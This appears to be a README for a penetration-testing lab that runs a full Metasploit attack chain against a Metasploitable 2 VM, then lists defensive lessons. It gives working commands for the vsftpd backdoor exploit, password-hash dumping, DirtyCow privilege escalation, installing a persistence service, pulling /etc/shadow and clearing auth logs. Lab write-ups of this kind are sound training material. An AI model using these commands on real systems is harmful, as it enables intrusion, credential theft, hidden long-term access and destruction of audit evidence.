# Metasploit-Attack-Defence-Simulation

### Full Exploitation → Privilege Escalation → Persistence → Defensive Cleanup

---

## Project Overview

This project demonstrates a real-world penetration testing scenario using the **Metasploit Framework**.

The project showcases a **complete attack chain** which includes:

- Reconnaissance
- Vulnerability identification
- Exploitation
- Meterpreter post-exploitation
- Privilege escalation
- Persistence installation
- Data exfiltration demonstration
- Cleanup and defensive considerations

The project highlights both **offensive and defensive security understanding** and shows the lifecycle of a cyberattack.

---

## Lab Setup

#### **Attacker Machine**

- **Kali Linux**
- **Tools used:**
  - Metasploit
  - Nmap
  - Netdiscover
  - Bash
  - Meterpreter

#### **Target Machine**

- **Metasploitable 2**
- *Intentionally vulnerable for research — contains multiple outdated services, perfect for real attack simulation.*

#### **Network Mode** *(VirtualBox)*

- Both machines must share a network: `Bridged Adapter` or `Host-Only Adapter`

---

## Pre-Flight Checklist

Before starting, ensure the following tools are installed on Kali:
```bash
sudo apt update && sudo apt install netdiscover -y
```

Also create the loot directory that will be used in Phase 7:
```bash
mkdir -p ~/loot
```

---

## PHASE 1 — Reconnaissance

Reconnaissance helps identify **open ports**, **running services**, and **potential vulnerabilities**.

This phase shows how real attackers gather intel before attacking.

### 1.1 Discover Target IP
```bash
sudo netdiscover -r 192.168.56.0/24
```

- Scans your local network range and discovers all active hosts
- Helps identify the IP address of the target machine

### 1.2 Full Nmap Scan
```bash
nmap -A -T4 -p- 192.168.56.5 -oN nmap-scan.txt
```

| Flag | Description |
|------|-------------|
| `-A` | Aggressive scan — OS detection, services, scripts |
| `-T4` | Speed level 4 |
| `-p-` | Scan all 65,535 ports |
| `-oN` | Save output to file |

> **This gives a complete attack surface map.**
> The outdated services on Metasploitable 2 provide an open door for attackers.
> ***This is why organizations should always patch, upgrade, and disable unused services.***

---

## PHASE 2 — Vulnerability Mapping

In this stage we interpret the Nmap results.

### Main Vulnerability

**VSFTPD v2.3.4 — intentionally planted backdoor**

When a user logs in with a username ending in `:)`, the daemon spawns a reverse shell on port 6200.

*This vulnerability:*

- Requires no authentication
- Allows immediate remote command execution
- Has been labeled **critical** by CVE databases

---

## PHASE 3 — Exploitation with Metasploit

### 3.1 Start Metasploit
```bash
msfconsole
```

### 3.2 Search for the exploit
```bash
search vsftpd
```

### 3.3 Load the module
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 3.4 Set the target and run
```bash
set RHOSTS 192.168.56.5
set RPORT 21
run
```

---

## PHASE 4 — Post-Exploitation (Meterpreter)

*Once inside, an attacker can begin elevating access.*

### 4.1 System Enumeration
```bash
sysinfo
getuid
```

This reveals:
- Operating System and kernel version
- Current user privileges

### 4.2 Enumerate Users
```bash
run post/linux/gather/enum_users
```

*Reveals user accounts on the system — helps map privilege escalation paths.*

### 4.3 Dump Password Hashes
```bash
run post/linux/gather/hashdump
```

> **Note:** `hashdump` alone is a Windows-only command. On Linux targets like Metasploitable 2, always use the post module above.

- Enables offline hash cracking
- Can be used for lateral movement
- Demonstrates total system compromise

---

## PHASE 5 — Privilege Escalation

Use Metasploit's built-in suggester to scan the kernel and system for working privilege escalation exploits:
```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Then load whichever exploit is suggested. For example, to use DirtyCow:
```bash
search dirty_cow
use [result from search]
set SESSION 1
run
```

> **Note:** Always run `search dirty_cow` first — the exact module name varies by Metasploit version. Use whatever appears in your results rather than hardcoding the path.

*Privilege escalation turns partial access into full root control.*

---

## PHASE 6 — Persistence Installation

*This phase demonstrates how attackers maintain long-term access.*
```bash
use post/linux/manage/persistence_service
set SESSION 1
set STARTUP SYSTEM
run
```

> **Note:** The legacy `run persistence` script has been removed from modern Metasploit. The module above is the correct replacement.

*Backdoors like these are how long-term breaches happen — Advanced Persistent Threat (APT) groups rely on persistence mechanisms to maintain hidden access for months or years.*

---

## PHASE 7 — Data Exfiltration Demonstration

*Data exfiltration is the end goal of most attacks.*

Download sensitive files to the loot directory created in the pre-flight checklist:
```bash
download /etc/shadow /root/loot/shadow.txt
```

> **Note:** Always use an absolute path for the destination. The `loot/` relative path will fail if the directory does not exist in your current working directory.

---

## PHASE 8 — Cleanup and Defensive Awareness

Delete the persistence script:
```bash
rm /tmp/persistence.sh
```

Clear logs *(demonstration only)*:
```bash
echo "" > /var/log/auth.log
```

*Attackers always try to cover their tracks. It is up to defenders to watch for anomalies — such as empty or missing logs, which are themselves red flags.*

---

## Lessons Learned

1. **Patch management is critical** — old services like VSFTPD v2.3.4 pose extreme risk and must be updated or disabled
2. **Defence-in-depth is essential** — if one service is compromised, layered security helps detect and contain intrusions
3. **Logging and monitoring saves organisations** — blue teams must detect abnormal connections, unusual login times, and missing or cleared logs
4. **Persistence mechanisms are the real threat** — modern APTs maintain long-term hidden access; detecting them requires continuous monitoring
5. **Penetration testing must be continuous** — a one-time scan is not enough as the attack surface always evolves
6. **Privilege escalation is inevitable once inside** — attackers never stop at user-level access; vertical and horizontal escalation must always be assumed

---

## Author Information

**Cleveland Henry Lore**

Cybersecurity Enthusiast | Penetration Testing

---

## Disclaimer

> This project is conducted in an **isolated lab environment** using intentionally vulnerable machines.
> All techniques demonstrated are for **educational purposes only**.\
> Unauthorized use of these techniques against systems you do not own or have explicit permission to test is **illegal and unethical**.

---

## License

This project is open-source and distributed under the **MIT License**.

See the `LICENSE` file for details.
